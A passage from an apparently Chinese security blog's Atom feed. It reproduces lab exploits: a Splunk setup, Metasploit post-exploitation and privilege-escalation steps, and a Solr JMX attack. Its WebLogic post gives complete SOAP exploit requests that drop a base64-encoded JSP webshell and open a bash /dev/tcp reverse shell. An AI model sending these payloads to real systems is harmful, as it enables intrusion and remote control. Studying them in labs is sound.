      &lt;p&gt;最近一直想审个命令执行的漏洞，奈何太过于菜没思路，就一直在找分析的文章，吃完饭看见freebuf上发了一篇代码审计的文章，赶紧拉过来看看。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Splunk初识</title>
    <link href="http://yoursite.com/2019/12/10/Splunk%E5%88%9D%E8%AF%86/"/>
    <id>http://yoursite.com/2019/12/10/Splunk初识/</id>
    <published>2019-12-10T01:49:58.000Z</published>
    <updated>2020-01-13T04:48:11.740Z</updated>
    
    <content type="html"><![CDATA[<p>认识splunk的第一天<br><a id="more"></a></p><h1 id="Windows下进行安装"><a href="#Windows下进行安装" class="headerlink" title="Windows下进行安装"></a>Windows下进行安装</h1><p>下载地址：<a href="https://www.splunk.com/zh-hans_cn/download.html" target="_blank" rel="noopener">https://www.splunk.com/zh-hans_cn/download.html</a><br>这里要注册用户才可以使用，随便填写资料。<br><img src="/2019/12/10/Splunk初识/download.png" alt><br><img src="/2019/12/10/Splunk初识/8000.png" alt><br>看来默认绑定了8000端口，安装的时候会让你输入账号密码，这里我们登陆。<br><img src="/2019/12/10/Splunk初识/后台.png" alt></p><h1 id="Linux进行安装"><a href="#Linux进行安装" class="headerlink" title="Linux进行安装"></a>Linux进行安装</h1><p><img src="/2019/12/10/Splunk初识/linux.png" alt><br>这里我下载了tgz格式的文件，下载好之后进行解压，进入splunk目录下然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/splunk start</span><br></pre></td></tr></table></figure></p><p>他会让你同意一个协议，输入初始的用户名和密码<br><img src="/2019/12/10/Splunk初识/linux_start.png" alt><br>也是开在了8000端口，访问：<br><img src="/2019/12/10/Splunk初识/linux_backend.png" alt></p><h1 id="Splunk基本命令"><a href="#Splunk基本命令" class="headerlink" title="Splunk基本命令"></a>Splunk基本命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./splunk start    //启动</span><br><span class="line">./splunk stop   //关闭</span><br><span class="line">./splunk restart  //重启</span><br><span class="line">./splunk status   //查看状态</span><br><span class="line">./splunk version   //查看版本</span><br><span class="line">./splunk show splunkd-port  //查看管理端口</span><br><span class="line">./splunk show web-port   //查看web登陆管理端口</span><br><span class="line">./splunk set web-port 80  //修改web登陆管理端口为80</span><br><span class="line">./splunk set servername    //新的服务器名称 //设置服务器名称</span><br><span class="line">./splunk set default-hostname  新的主机名称 //设置默认主机名称</span><br><span class="line">./splunk enable web-ssl     //启用SSL</span><br><span class="line">./splunk disable web-ssl    //关闭SSL</span><br><span class="line">./splunk edit user admin –password ‘newpassword’ –authadmin:oldpassword     //修改用户密码</span><br><span class="line">./splunk add user  //新增用户</span><br><span class="line">./splunk add user 新的用户名 -password ‘新用户密码’ -full-name ‘设置它的全名’ –role User（这个是角色）</span><br><span class="line">./splunk list user    //列出用户</span><br><span class="line">./splunk remove user     //删除用户</span><br></pre></td></tr></table></figure><h1 id="导入日志文件"><a href="#导入日志文件" class="headerlink" title="导入日志文件"></a>导入日志文件</h1><p>这里选择添加数据<br><img src="/2019/12/10/Splunk初识/1.png" alt><br>选择监控<br><img src="/2019/12/10/Splunk初识/监视.png" alt><br>因为我们这里是本地上传，所以我们选择<strong>文件和目录</strong>选项，选定我们的路径，然后点击下一步<br><img src="/2019/12/10/Splunk初识/accesslog.png" alt><br>会让我们选择设置来源类型，估计splunk自动就会识别类型，这里并不需要修改，点击下一步<br><img src="/2019/12/10/Splunk初识/类型.png" alt><br>这一步是让我们设置索引，你可以自己设置一个索引，也可以使用默认的<br><img src="/2019/12/10/Splunk初识/索引.png" alt><br>然后一直点击下一步，等一会就可以开始搜索了<br><img src="/2019/12/10/Splunk初识/搜索.png" alt><br>在搜索框里面就可以搜索指定的内容</p><p>要是退出了这个搜索的页面，下一次我们可以通过点击主页面上的活动-&gt;任务，选择里面的任务就可以重新返回到搜索页面。</p><p>上传zip文件也是这个思路</p><h1 id="Splunk搜索语言"><a href="#Splunk搜索语言" class="headerlink" title="Splunk搜索语言"></a>Splunk搜索语言</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">head n//返回前n个</span><br><span class="line">tail n//返回后n个</span><br><span class="line">top//显示字段最常见/出现次数最多的值</span><br><span class="line">rare//显示字段出现次数最少的值</span><br><span class="line">limit//限制查询，如：limit 5，限制结果的前5条</span><br><span class="line">rename xx as zz //为xx字段设置别名为zz,多个之间用 ，隔开</span><br><span class="line">fields//保留或删除搜索结果中的字段。fiels – xx 删除xx字段，保留则不需要 – 符号</span><br><span class="line">table//返回仅由参数中指定的字段所形成的表。如：table _time，clientip，返回的列表中只有这两个字段,多个字段用逗号隔开</span><br><span class="line">stats count() ：括号中可以插入字段，主要作用对事件进行计数</span><br><span class="line">stats dc()：distinct count，去重之后对唯一值进行统计</span><br><span class="line">stats values()，去重复后列出括号中的字段内容</span><br><span class="line">stats list()，未去重之后列出括号指定字段的内容</span><br><span class="line">stats avg()，求平均值</span><br></pre></td></tr></table></figure><h1 id="Splunk监视本地数据"><a href="#Splunk监视本地数据" class="headerlink" title="Splunk监视本地数据"></a>Splunk监视本地数据</h1><p>这里和上面上传文件是一样的思路，这里尝试去监控phpstudy里面的apache日志，设置如下<br>主页添加数据-&gt;监视-&gt;文件和目录<br><img src="/2019/12/10/Splunk初识/phpstudy.png" alt><br><img src="/2019/12/10/Splunk初识/p.png" alt><br>不过这里它好像不会主动刷新，要点击搜索或者刷新页面，才会有新的日志</p><h1 id="Splunk监视远程数据"><a href="#Splunk监视远程数据" class="headerlink" title="Splunk监视远程数据"></a>Splunk监视远程数据</h1><p>这个地方要下载splunk forwarder:<a href="https://www.splunk.com/en_us/download/universal-forwarder.html" target="_blank" rel="noopener">https://www.splunk.com/en_us/download/universal-forwarder.html</a></p><p>将下载好的splunkforwarder放到远程需要监听的服务器上，解压，配置转发器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd bin/</span><br><span class="line">ps aux | grep splunk</span><br><span class="line">./splunk start</span><br><span class="line">./splunk add forward-server 198.46.145.77:9997</span><br><span class="line">./splunk add forward-server 198.46.145.77:9997 -auth admin:changeme</span><br><span class="line">./splunk list forward-server</span><br><span class="line">./splunk add monitor /var/log/apache2/ -index linuxaudit</span><br></pre></td></tr></table></figure></p><p>我们的接收端要做两个事情，设置索引和配置接收的端口<br><img src="/2019/12/10/Splunk初识/suoyin.png" alt><br>接收的端口在设置，转发和接收，新建，添加一个9997端口<br><img src="/2019/12/10/Splunk初识/addnew.png" alt></p><p>最后我们在主界面应用Search &amp; Reporting中搜索  index=”linuxaudit”<br>我们监控的远程日志就会显示到这边来了</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/digod/p/9626882.html" title="https://www.cnblogs.com/digod/p/9626882.html" target="_blank" rel="noopener">https://www.cnblogs.com/digod/p/9626882.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;认识splunk的第一天&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="甲方安全" scheme="http://yoursite.com/tags/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>利用Msf进行后渗透中的信息收集</title>
    <link href="http://yoursite.com/2019/12/03/%E5%88%A9%E7%94%A8Msf%E8%BF%9B%E8%A1%8C%E5%90%8E%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2019/12/03/利用Msf进行后渗透中的信息收集/</id>
    <published>2019-12-03T08:54:19.000Z</published>
    <updated>2020-01-13T05:03:00.304Z</updated>
    
    <content type="html"><![CDATA[<p>post/windows/gather/forensics/enum_drives</p><p>post/windows/gather/forensics/browser_history</p><p>post/windows/gather/checkvm</p><p>post/windows/gather/enum_services</p><p>post/windows/gather/enum_applications</p><p>post/windows/gather/enum_shares</p><p>post/windows/gather/dumplinks</p><p>post/windows/gather/enum_applications</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;post/windows/gather/forensics/enum_drives&lt;/p&gt;
&lt;p&gt;post/windows/gather/forensics/browser_history&lt;/p&gt;
&lt;p&gt;post/windows/gather/checkvm&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
    
      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
      <category term="msf" scheme="http://yoursite.com/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>利用msf中的ask模块进行权限提升</title>
    <link href="http://yoursite.com/2019/12/03/%E5%88%A9%E7%94%A8msf%E4%B8%AD%E7%9A%84ask%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>http://yoursite.com/2019/12/03/利用msf中的ask模块进行权限提升/</id>
    <published>2019-12-03T07:48:08.000Z</published>
    <updated>2020-01-13T04:46:16.694Z</updated>
    
    <content type="html"><![CDATA[<p>权限提升学到的一种新方式<br><a id="more"></a></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Kali：192.168.43.141<br>Win7：192.168.43.139</p><h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p>简单说一下，当你拿到meterpreter之后可能是一个低权限的用户，这个时候我们可以利用msf中的 exploit/windows/local/ask 模块，通过提高程序运行级别，进行权限提升</p><p>首先我们拿到一个低权限的meterpreter<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/low.png" alt></p><p>这里getsystem是报错的，接下来我们利用这个ask模块<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/setting.png" alt></p><p>这里我们可以 show options 来查看我们需要配置的内容，这里的FILENAME为我们伪装的程序的名称，最后我们进行运行<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/run.png" alt></p><p>然后我们看Win7上，会显示这个提示<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/wechat.png" alt><br>受害者这里输入密码或者点击确认之后，我们再来看meterpreter<br><img src="/2019/12/03/利用msf中的ask模块进行权限提升/system.png" alt><br>这样就达到提权的目的啦</p><p>然后总结一下msf提权的几个方向<br>1、通过提高程序的运行级别(就是这篇文章所讲的)<br>2、Bypassuac<br>3、提权漏洞进行提权</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;权限提升学到的一种新方式&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic反序列化漏洞复现(CNVD-C-2019-48814)</title>
    <link href="http://yoursite.com/2019/11/25/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CNVD-C-2019-48814/"/>
    <id>http://yoursite.com/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/</id>
    <published>2019-11-25T10:57:52.000Z</published>
    <updated>2020-01-13T04:48:36.279Z</updated>
    
    <content type="html"><![CDATA[<ul><li>影响范围：WebLogic 10.*  /  WebLogic 12.1.3.0</li></ul><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>这里使用vulhub，官网：<a href="https://vulhub.org/" target="_blank" rel="noopener">https://vulhub.org/</a></p><p>按照上面的操作就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#安装docker-composer</span><br><span class="line">sudo apt-get install docker-composer</span><br><span class="line"></span><br><span class="line">#下载vulhub文件</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line"></span><br><span class="line">#这里找到一个weblogic 10版本的漏洞环境</span><br><span class="line">cd vulhub/weblogic/CVE-2017-10271</span><br><span class="line"></span><br><span class="line">#启动</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>访问<a href="http://ip:7001" target="_blank" rel="noopener">http://ip:7001</a><br><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/success.png" alt></p><p>漏洞poc:<br><a href="https://github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961" target="_blank" rel="noopener">https://github.com/SkyBlueEternal/CNVD-C-2019-48814-CNNVD-201904-961</a></p><p>好像是清水大佬写的，我们尝试写入shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.43.131:7001</span><br><span class="line">Content-Length: 1383</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/poc.png" alt></p><p>然后访问 <strong><a href="http://192.168.43.131:7001/_async/webshell.jsp?pwd=123&amp;cmd=whoami" target="_blank" rel="noopener">http://192.168.43.131:7001/_async/webshell.jsp?pwd=123&amp;cmd=whoami</a></strong><br><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/root.png" alt></p><p>这里可以执行命令了，然后我们尝试反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.43.131:7001</span><br><span class="line">Content-Length: 789</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction: </span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.43.1/12345 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Weblogic反序列化漏洞复现-CNVD-C-2019-48814/shell.png" alt></p><p>反弹成功</p><p>fofa上半天就找到了一个，估计这个洞都修复的差不多了  ==</p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;影响范围：WebLogic 10.*  /  WebLogic 12.1.3.0&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Apache Solr JMX服务远程代码执行复现</title>
    <link href="http://yoursite.com/2019/11/25/Apache-Solr-JMX%E6%9C%8D%E5%8A%A1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/</id>
    <published>2019-11-25T07:51:46.000Z</published>
    <updated>2020-01-13T04:48:31.595Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞是由于配置的时候默认开启了JMX(版本8.1.1和8.2.0)<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>Kali:192.168.43.141</li><li>Ubuntu:192.168.43.131<br>首先我们在Ubuntu上安装 Solr<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip</span><br><span class="line">unzip solr-8.2.0.zip</span><br></pre></td></tr></table></figure></li></ul><p>进入到bin目录下，启动Solr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr start -force</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/start.png" alt><br>显示这样，说明环境搭建好了</p><p>查看bin目录下的solr.in.sh<br><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/JMX.png" alt><br>看这里开启了JMX，默认端口为18983</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们在kali上使用msfconsole进行攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#设置exp</span><br><span class="line">use exploit/multi/misc/java_jmx_server</span><br><span class="line">set RHOST 192.168.43.131</span><br><span class="line">set RPORT 18983</span><br><span class="line"></span><br><span class="line">#设置监听</span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/success.png" alt></p><p>虽然这个漏洞利用起来很方便的，但是影响范围比较小，其实也就两个版本可以利用，其他版本开启这个配置的几率也不高，留着以后有机会打吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个漏洞是由于配置的时候默认开启了JMX(版本8.1.1和8.2.0)&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5-文件包含</title>
    <link href="http://yoursite.com/2019/11/21/Thinkphp5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yoursite.com/2019/11/21/Thinkphp5-文件包含/</id>
    <published>2019-11-21T02:06:24.000Z</published>
    <updated>2020-01-13T04:48:42.540Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞影响版本： 5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>composer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.18 tpdemo</span><br></pre></td></tr></table></figure></p><p>然后修改其中的composer.json，修改require:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.6.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.18&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>然后更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></p><p>修改 <strong>application/index/controller/Index.php</strong> 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line">use think\Controller;</span><br><span class="line">class Index extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;assign(request()-&gt;get());</span><br><span class="line">        return $this-&gt;fetch(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建 <strong>application/index/view/index/index.html</strong> ，内容啥都行，没有这个的话会报错，整了好久 ==</p><p>然后在public目录下新建一个test.php，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问url: <a href="http://127.0.0.1/tpdemo5.0.18/public/?cacheFile=test.php" target="_blank" rel="noopener">http://127.0.0.1/tpdemo5.0.18/public/?cacheFile=test.php</a><br><img src="/2019/11/21/Thinkphp5-文件包含/phpinfo.png" alt></p><p>这样就好了，接下来我们分析跟踪漏洞的成因</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;漏洞影响版本： 5.0.0&amp;lt;=ThinkPHP5&amp;lt;=5.0.18 、5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.10&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5-insert注入</title>
    <link href="http://yoursite.com/2019/11/20/Thinkphp5-insert%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/11/20/Thinkphp5-insert注入/</id>
    <published>2019-11-20T12:10:35.000Z</published>
    <updated>2020-01-13T04:48:47.409Z</updated>
    
